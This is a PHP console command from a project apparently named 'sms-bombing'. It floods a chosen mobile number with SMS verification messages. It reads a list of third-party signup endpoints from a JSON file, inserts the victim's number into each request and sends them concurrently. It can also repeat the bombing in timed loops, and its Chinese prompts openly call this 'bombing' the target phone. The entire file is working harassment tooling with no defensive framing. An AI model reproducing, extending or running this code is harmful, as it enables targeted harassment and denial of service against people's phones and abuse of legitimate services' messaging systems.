<?php

/*
 * This file is part of james.xue/sms-bombing.
 *
 * (c) xiaoxuan6 <1527736751@qq.com>
 *
 * This source file is subject to the MIT license that is bundled
 * with this source code in the file LICENSE.
 *
 */

namespace App\Commands;

use Exception;
use GuzzleHttp\{Client, Pool};
use GuzzleHttp\Psr7\{Request, Response};
use LaravelZero\Framework\Commands\Command;
use Symfony\Component\Console\Helper\ProgressBar;
use GuzzleHttp\Exception\{ConnectException, RequestException};

use function Laravel\Prompts\text;

class SMSBombingCommand extends Command
{
    public const LABEL = '请输入有效的手机号';

    /**
     * The signature of the command.
     *
     * @var string
     */
    protected $signature = 'send
        {phone? : 轰炸手机号}
        {--num=10 : 短信发送数量}
        {--l|loop=0 : 启动循环轰炸次数}
        {--i|intervals=30 : 循环轰炸间隔时间}
        {--t|timeout=30 : 请求超时时间}
        {--length=64 : 报错展示长度}
        {--stdout=false : 是否输出网站描述}
    ';

    /**
     * The description of the command.
     *
     * @var string
     */
    protected $description = 'sms bombing';

    /**
     * Execute the console command.
     */
    public function handle(): int
    {
        $phone = str($this->argument('phone') ?? text(
            self::LABEL,
            self::LABEL,
            required: true,
            validate: fn (string $value): bool|string => preg_match('/^1[3-9]\d{9}$/', $value) ? true : self::LABEL,
        ))->trim()->toString();


        $i = 1;
        $status = true;
        $num = $this->option('num');
        $loop = $this->option('loop');
        $client = new Client(['verify' => false, 'timeout' => $this->option('timeout')]);
        $apis = collect(json_decode(file_get_contents(__DIR__ . '/../../api.json'), true));

        do {
            $apis = $num == 'all' ? $apis : ($num > $apis->count() ? $apis : $apis->random($num));
            $requests = function () use ($apis, $phone) {
                $fn = fn ($phone, $url): string|array => str_replace('[phone]', $phone, (string)$url);
                foreach ($apis as $api) {
                    $url = $fn($phone, $api['url']);
                    $body = is_array($api['data']) ? array_map(fn ($item): string|array => $fn($phone, $item), $api['data']) : [];

                    if (isset($api['time'])) {
                        $body = array_map(fn ($data): string => str_replace('[time]', time(), $data), $body);
                    }

                    $body = isset($api['form']) ? http_build_query($body) : json_encode($body, JSON_UNESCAPED_UNICODE);
                    yield new Request($api['method'], $url, is_array($api['header']) ? $api['header'] : [], $body);
                }
            };

            $fn = fn ($body): string => mb_strlen((string)$body) > 128 ? mb_substr((string)$body, 0, $this->option('length')) : $body;

            $outFn = function ($response, $index) use ($apis): void {
                $desc = $apis->get($index)['desc'];

                $message = $this->option('stdout') ?
                    PHP_EOL . "请求网站：<comment>{$desc}</comment> " .
                    PHP_EOL . "请求结果：<comment>{$response}</comment>" :
                    " 请求结果：<comment>{$response}</comment>";

                $this->getOutput()->writeln("<info>索引：{$index}</info>" . $message);
            };

            (new Pool(
                $client,
                $requests(),
                [
                    'concurrency' => 5,
                    'fulfilled' => function (Response $response, $index) use ($outFn, $fn): void {
                        $responseBody = $response->getBody();
                        $contents = $responseBody->getContents();
                        $body = $fn($responseBody);

                        if (mb_strlen($responseBody) == mb_strlen($body)) {
                            try {
                                $body = json_encode(json_decode($responseBody, true), JSON_UNESCAPED_UNICODE);
                            } catch (Exception) {
                            }
                        }

                        $body = (is_null($body) or $body == 'null') ? trim($contents) : $body;
                        $outFn($body, $index);
                    },
                    'rejected' => function (RequestException|ConnectException $reason, $index) use ($outFn, $fn): void {
                        $message = $reason instanceof ConnectException ? '请求超时，稍后重试！' : $fn($reason->getMessage());

                        $outFn($message, $index);
                    },
                ]
            ))
                ->promise()
                ->wait();

            if ($loop > 0 && $i < $loop) {
                $i++;

                $intervals = $this->option('intervals');
                if ($intervals > 0) {
                    $this->getOutput()->writeln(PHP_EOL . "<info>循环轰炸中…… 等待第 {$i} 轮轰炸</info>");
                    $progressBar = new ProgressBar($this->getOutput());
                    $progressBar->start($intervals);
                    $j = 0;
                    while ($j++ < $intervals) {
                        sleep(1);
                        $progressBar->advance();
                    }
                    $progressBar->finish();
                    $this->getOutput()->writeln("");
                }

            } else {
                $status = false;
            }

        } while ($status);

        return self::SUCCESS;
    }
}
